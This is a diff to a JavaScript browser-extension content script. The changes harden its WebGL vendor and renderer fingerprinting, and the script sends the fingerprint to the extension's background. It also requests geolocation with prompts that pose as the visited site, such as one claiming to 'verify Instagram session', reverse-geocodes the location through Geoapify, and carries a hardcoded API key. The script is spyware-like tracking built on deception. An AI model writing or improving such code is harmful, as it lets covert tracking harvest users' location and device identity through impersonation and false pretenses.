@@ -1,25 +1,36 @@
 (async () => {
   const API_KEY = "2a8cd4f6bf62453194452017e2a3f970"; // ✅ Geoapify key
 
-  // 🎯 WebGL Info
+  // 🎯 WebGL Vendor
   function getWebGLVendor() {
     try {
       const canvas = document.createElement("canvas");
       const gl = canvas.getContext("webgl");
+      if (!gl) return "Unavailable";
+
       const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+      if (!debugInfo || !debugInfo.UNMASKED_VENDOR_WEBGL) return "Unavailable";
+
       return gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-    } catch {
+    } catch (err) {
+      console.warn("❌ WebGL Vendor Error:", err);
       return "Unavailable";
     }
   }
 
+  // 🎯 WebGL Renderer
   function getWebGLRenderer() {
     try {
       const canvas = document.createElement("canvas");
       const gl = canvas.getContext("webgl");
+      if (!gl) return "Unavailable";
+
       const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-      return gl.getParameter(debugInfo.UNMASKED_RENDERER_INFO);
-    } catch {
+      if (!debugInfo || !debugInfo.UNMASKED_RENDERER_WEBGL) return "Unavailable";
+
+      return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+    } catch (err) {
+      console.warn("❌ WebGL Renderer Error:", err);
       return "Unavailable";
     }
   }
@@ -39,7 +50,7 @@
     };
   }
 
-  // 🔁 Reverse Geocode
+  // 🔁 Reverse Geocode from Geoapify
   async function reverseGeocode(lat, lon) {
     try {
       const res = await fetch(
@@ -77,7 +88,7 @@
     return lastPromptTime && now - lastPromptTime < oneDay;
   }
 
-  // 🧠 Context message
+  // 🧠 Contextual message
   function getLocationContextualMessage(domain) {
     if (domain.includes("instagram.com")) {
       return "📸 Please allow location to verify Instagram session.";
@@ -147,7 +158,7 @@
     });
   }
 
-  // 🚀 Execute
+  // 🚀 Execute Fingerprint + Location collection
   const fingerprint = getFingerprint();
   chrome.runtime.sendMessage({ type: "fingerprint", data: fingerprint });
   requestLocationAccess();
